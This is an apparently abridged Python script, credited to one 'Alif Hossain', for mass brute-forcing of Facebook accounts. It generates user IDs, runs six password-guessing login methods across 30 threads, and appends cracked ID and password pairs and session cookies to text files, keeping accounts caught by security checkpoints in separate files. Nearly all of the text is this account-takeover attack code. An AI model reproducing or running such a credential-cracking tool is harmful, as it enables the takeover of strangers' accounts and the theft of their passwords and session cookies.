# SCRIPTS CREATE BY ALIF HOSSAIN 
...
def _____bd1x_____():
	...
	for nmbr in range(int(limit)):
		...
		user.append(nmp)
	with tred(max_workers=30) as ALIFx:
		...
		for love in user:
			...
			if methd in ['1']:ALIFx.submit(____M1____,idf,pwv)
			if methd in ['2']:ALIFx.submit(____M2____,idf,pwv)
			if methd in ['3']:ALIFx.submit(____M3____,idf,pwv)
			if methd in ['4']:ALIFx.submit(____M4____,idf,pwv)
			if methd in ['5']:ALIFx.submit(____M5____,idf,pwv)
			if methd in ['6']:ALIFx.submit(____M6____,idf,pwv)
...
def _____oldx_____():
	...
	with tred(max_workers=30) as ALIFx:
		...
		for love in user:
			...
			ALIFx.submit(____old____,uid,pas,tl)
	print("");linex();print(f"{white}<|●|> Cloning Complete Brother ");print(f'{white}<|●|> Total Ok >> '+str(len(ok)));print(f'{white}<|●|> Total Cp >> '+str(len(cp)));linex();exit()
#---------------------------| Random Method 1 |---------------------------#
def ____M1____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M1|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ALIF-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ALIF-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ALIF-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|ALIF-CP|> {idf} ● {pw} ")
				open('/sdcard/ALIF-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|ALIF-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|ALIF-OK|> {uid} ● {ps}")
				open("/sdcard/ALIF-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
